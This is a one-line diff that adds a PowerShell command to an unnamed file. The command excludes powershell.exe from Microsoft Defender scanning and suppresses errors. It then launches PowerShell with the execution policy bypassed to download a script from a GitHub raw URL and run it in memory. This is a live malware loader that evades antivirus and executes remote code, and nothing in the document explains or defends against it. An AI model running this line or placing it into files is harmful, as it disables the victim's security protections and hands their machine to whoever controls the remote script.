@@ -1,0 +1,1 @@
+Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue; Start-Sleep -Seconds 5; powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& { [ScriptBlock]::Create((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ng8zhzrzhs-gif/rtrfdf/main/nn.ps1' -UseBasicParsing).Content).Invoke() }"
